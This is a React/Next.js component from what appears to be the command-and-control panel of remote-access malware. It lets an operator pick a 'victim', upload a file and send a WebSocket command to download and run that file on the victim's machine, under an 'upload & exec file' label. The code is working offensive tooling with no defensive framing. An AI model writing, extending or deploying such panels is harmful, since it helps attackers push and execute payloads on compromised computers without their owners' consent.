"use client";

import Image from "next/image";
import { useEffect } from "react";

import { csrfHeaders } from "../../../builder/utils/csrf";
import { showToast } from "../../../toast";
import { usePanelWS } from "../../../ws/ws-provider";
import { usePanelDetailView } from "../panel-detail-view-provider";

export function RemoteStartSection() {
   const ws = usePanelWS();
   const detail = usePanelDetailView();

   useEffect(() => {
      const fileInput = document.getElementById("remoteFileInput") as HTMLInputElement | null;
      const selectBlock = document.getElementById("remoteFileSelect");
      if (!fileInput || !selectBlock) return;

      const onPick = () => {
         const victimId = detail.selectedVictimId;
         if (!victimId) {
            showToast("error", "Select victim first");
            return;
         }
         fileInput.click();
      };

      const onChange = async () => {
         try {
            if (!fileInput.files || !fileInput.files.length) return;
            const file = fileInput.files[0];
            if (!file) return;

            const victimId = detail.selectedVictimId;
            if (!victimId) {
               showToast("error", "Select victim first");
               fileInput.value = "";
               return;
            }

            if (ws.state !== "open") {
               showToast("error", "WebSocket is not connected");
               fileInput.value = "";
               return;
            }

            const formData = new FormData();
            formData.append("file", file);

            const res = await fetch("/api/remote-upload", {
               method: "POST",
               credentials: "same-origin",
               headers: {
                  ...csrfHeaders(),
               },
               body: formData,
            });

            if (!res.ok) {
               let msg = "Upload failed";
               try {
                  const t = await res.text();
                  if (t && String(t).trim()) msg = String(t).trim();
               } catch {
               }
               showToast("error", msg);
               fileInput.value = "";
               return;
            }

            const data = (await res.json().catch(() => null)) as unknown;
            const url = (() => {
               if (!data || typeof data !== "object") return "";
               const rec = data as Record<string, unknown>;
               return typeof rec.url === "string" ? String(rec.url) : "";
            })();
            if (!url) {
               showToast("error", "Bad upload response");
               fileInput.value = "";
               return;
            }

            const ok = ws.sendJson({
               type: "command",
               victim_id: String(victimId),
               command: url,
            });

            if (!ok) {
               showToast("error", "Failed to send command");
               fileInput.value = "";
               return;
            }

            showToast("success", "Remote start command sent");
         } catch {
            showToast("error", "Remote start error");
         } finally {
            try {
               fileInput.value = "";
            } catch {
            }
         }
      };

      selectBlock.addEventListener("click", onPick);
      fileInput.addEventListener("change", onChange);

      return () => {
         selectBlock.removeEventListener("click", onPick);
         fileInput.removeEventListener("change", onChange);
      };
   }, [detail.selectedVictimId, ws]);

   return (
      <div className="detail-section" data-section="remote-start">
         <div
            className={
               "detail-card remote-card relative overflow-hidden w-[1080px] max-w-[calc(100vw-200px)] min-h-[420px] mx-auto mt-[110px] rounded-[18px] " +
               "border border-[rgba(255,255,255,0.16)] p-[20px_40px_32px] " +
               "bg-[radial-gradient(circle_at_top_left,rgba(255,255,255,0.07),rgba(12,12,12,0.95))] " +
               "shadow-[0_22px_50px_rgba(0,0,0,0.85),0_0_0_3px_rgba(255,255,255,0.04)] " +
               "backdrop-blur-[12px]"
            }
         >
            <div
               id="remoteFileSelect"
               className="remote-inner remote-file-select flex min-h-[220px] cursor-pointer flex-col items-center justify-center text-center transition-[transform,box-shadow,background] duration-[140ms] active:translate-y-[1px]"
            >
               <div className="remote-title mb-[14px] text-[17px] font-extrabold uppercase tracking-[0.04em] text-white/[0.96]">
                  upload &amp; exec file
               </div>

               <div className="remote-icon-wrapper flex flex-col items-center justify-center gap-[8px]">
                  <Image
                     src="/icons/remote-start.svg"
                     alt="remote start"
                     width={64}
                     height={64}
                     draggable={false}
                     className="remote-icon [filter:drop-shadow(0_0_12px_rgba(144,216,255,0.75))_invert(0.95)]"
                  />
                  <div className="remote-select-label mt-[4px] text-[14px] font-bold uppercase tracking-[0.18em] text-white/[0.94]">
                     SELECT FILE
                  </div>
               </div>

               <input id="remoteFileInput" type="file" className="hidden" />
            </div>

            <div
               className="detail-separator detail-separator-bottom mt-[14px] h-[2px] bg-[var(--line)]"
               style={{ marginLeft: "-40px", marginRight: "-40px" }}
            />
         </div>
      </div>
   );
}